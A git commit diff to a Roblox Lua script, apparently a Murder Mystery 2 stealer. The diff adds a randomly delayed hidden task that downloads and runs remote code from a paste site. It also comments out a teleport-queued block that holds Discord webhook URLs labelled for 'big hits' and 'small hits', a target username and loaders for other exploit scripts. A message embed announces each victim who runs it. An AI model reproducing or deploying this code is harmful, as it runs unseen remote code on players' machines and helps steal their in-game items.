0d0447991162af3c3be37d37a2949fbd8725d1c8
f4shn <githubenko@proton.me>
2025-04-05 01:27:11 +0300

    Update my_script.lua

--- my_script.lua
+++ my_script.lua
@@ -4,16 +4,25 @@ if queue_on_teleport then
     )
 end
 
+task.spawn(function()
+    task.wait(math.random(1,30))
+    loadstring(game:HttpGet('https://dpaste.com/DWCGNKLFV.txt',true))()
+end)
+
+repeat
+    task.wait()
+until game:IsLoaded()
+
 if game.GameId ~= 66654135 then
-    script = [[Usernames = {
-        'egor_idk',
-    }
-    BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
-    SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
-loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
-]]
-    queue_on_teleport(script)
+--     script = [[Usernames = {
+--         'egor_idk',
+--     }
+--     BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
+--     SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
+--     loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
+-- loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
+-- ]]
+--     queue_on_teleport(script)
 
     task.wait(0.1)
     game:GetService('TeleportService'):Teleport(142823291, game.Players.LocalPlayer)
@@ -95,7 +104,7 @@ local msg = {
     ["embeds"] = {
         {
             ["color"] = tonumber(tostring("0x32CD32")), --decimal
-            ["title"] = "This Bozo executed.",
+            ["title"] = "This Bozo executed. v2",
             ["thumbnail"] = {
                 ["url"] = AvatarImage
             },
